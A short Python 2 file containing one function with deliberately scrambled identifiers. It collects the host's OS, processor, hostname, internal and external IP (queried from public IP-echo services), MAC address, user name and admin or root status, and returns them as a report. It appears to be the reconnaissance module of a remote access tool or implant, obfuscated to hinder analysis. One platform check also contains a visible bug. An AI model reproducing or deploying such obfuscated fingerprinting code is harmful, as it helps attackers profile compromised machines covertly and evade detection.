# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc(plat_type):
    wZNkWsTscJXplsBRhUgsTwQmxFPFQGaR = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    rSvThpkyEfMesCJqPDmAFaFvwvNNiNcy = getpass.getuser()
    kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK    = socket.gethostname()
    SPBRJGKHyWFlrSHmvkUIBGxEftXLHoSe        = socket.getfqdn()
    tUEoEyuszeFjXYXnkwDOuIOAThtpoXiK = socket.gethostbyname(kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK)
    pjErkdYuGCqfdMwSSeYJrKjadyufffgG     = uuid.getnode()
    BEGcstbJaWVOwjecYyVtuWPCltcOdtwf         = ':'.join(("%012X" % pjErkdYuGCqfdMwSSeYJrKjadyufffgG)[jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ:jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ+2] for jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ in range(0, 12, 2))
    qwZbvbNJUpPaybfwufnvOkPIzObVjmZx = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    IaXJZwDBalkPkInXaqhPIHYINhRIMDPj = ''
    for agiQWYdtFDyDNbELmUPwfeZwMrPuZFFh in qwZbvbNJUpPaybfwufnvOkPIzObVjmZx:
        try:
            IaXJZwDBalkPkInXaqhPIHYINhRIMDPj = urllib.urlopen('http://'+agiQWYdtFDyDNbELmUPwfeZwMrPuZFFh).read().rstrip()
        except IOError:
            pass
        if IaXJZwDBalkPkInXaqhPIHYINhRIMDPj and (6 < len(IaXJZwDBalkPkInXaqhPIHYINhRIMDPj) < 16):
            break
    apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = False
    if plat_type.startswith('win'):
        apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = os.getuid() == 0
    RjCUjJkhvFhsmeZqDGXFrmzItBIPbWTU = 'Yes' if apVZHIbwGtitliQAGpYfrkfYSHBIDyzE else 'No'
    CTpjsxTmqqvsuyxrhjoOBnEkWeINMxTn = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(wZNkWsTscJXplsBRhUgsTwQmxFPFQGaR, processor, architecture,
    kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK, SPBRJGKHyWFlrSHmvkUIBGxEftXLHoSe, tUEoEyuszeFjXYXnkwDOuIOAThtpoXiK, IaXJZwDBalkPkInXaqhPIHYINhRIMDPj, BEGcstbJaWVOwjecYyVtuWPCltcOdtwf, rSvThpkyEfMesCJqPDmAFaFvwvNNiNcy, RjCUjJkhvFhsmeZqDGXFrmzItBIPbWTU)
    return CTpjsxTmqqvsuyxrhjoOBnEkWeINMxTn
